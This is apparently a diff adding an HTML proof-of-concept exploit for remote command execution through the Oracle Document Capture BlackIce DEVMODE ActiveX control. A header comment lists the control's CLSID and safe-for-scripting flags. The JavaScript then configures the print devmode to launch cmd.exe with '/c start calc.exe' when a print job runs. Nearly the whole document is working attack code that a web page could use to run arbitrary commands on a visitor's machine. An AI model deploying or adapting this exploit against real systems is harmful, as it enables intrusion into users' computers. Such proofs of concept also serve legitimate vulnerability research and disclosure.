@@ -1,0 +1,27 @@
+&lt;!-- Oracle Document Capture BlackIce DEVMODE ActiveX Control remote command execution
+
+CLSID: {1503569A-0AE2-4333-B6E6-466AB0BC73E5}
+Progid: BLACKICEDEVMODE.BlackIceDEVMODECtrl.1
+Binary Path: C:\WINDOWS\system32\BlackIceDEVMODE.ocx
+Safe For Initialization (Registry): True
+Safe For Scripting (Registry): True
+--&gt;
+&lt;script language=&#039;javascript&#039;&gt;
+
+  var BlackIce = new ActiveXObject(&quot;BLACKICEDEVMODE.BlackIceDEVMODECtrl.1&quot;);
+
+  pBlackIceDEVMODE = BlackIce.LoadBlackIceDEVMODE (&quot;Oracle Document Capture&quot;);
+
+  BlackIce.EnableKeepExistingFiles (pBlackIceDEVMODE);
+  BlackIce.EnableStartApplication (pBlackIceDEVMODE);
+  BlackIce.EnableStartBeforePrint(pBlackIceDEVMODE);
+  BlackIce.SetApplicationPath(&quot;c:\\windows\\system32\\cmd.exe&quot;,pBlackIceDEVMODE);
+  BlackIce.EnablePassParameters(pBlackIceDEVMODE);
+  BlackIce.SetStartApplicationParamCode(pBlackIceDEVMODE,1,6);
+  BlackIce.SetCustomStartAppParameter(pBlackIceDEVMODE,&quot; /c start calc.exe&quot;);
+  BlackIce.SaveBlackIceDEVMODE(&quot;Oracle Document Capture&quot;,pBlackIceDEVMODE);
+  BlackIce.ControlJob(&quot;Oracle Document Capture&quot;,1,4); //JOB_CONTROL_PAUSE  1
+                                                      //JOB_CONTROL_RESUME 2
+                                                      //JOB_CONTROL_RESTART 4
+                                                      //JOB_CONTROL_DELETE 5
+&lt;/script&gt;
